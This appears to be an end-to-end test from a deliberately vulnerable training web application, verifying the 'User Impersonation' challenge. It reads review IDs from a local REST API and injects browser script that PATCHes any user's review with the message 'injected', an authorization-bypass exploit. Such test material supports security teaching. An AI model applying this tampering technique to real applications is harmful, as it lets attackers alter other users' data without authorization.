const config = require('config')
const http = require('http');

const REST_URL = 'http://localhost:3000/rest'

describe('/#/search', () => {
  beforeEach(() => {
    browser.get('/#/search')
  })

  describe('challenge "User Impersonation"', () => {
    fit('should be possible to edit any review', () => {
      browser.waitForAngularEnabled(false)
      let reviewId

      http.get(REST_URL + '/product/1/reviews', (res) => {
      let body = ''

      res.on('data', chunk => {
        body += chunk
      })

      res.on('end', () => {
        const response = JSON.parse(body)
        reviewId = response.data[0]._id
      })
    })

      browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.patch(\'/rest/product/reviews\', { "id": \"'+reviewId+'\", "message": "injected" });')
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'User Impersonation' })
  })
})
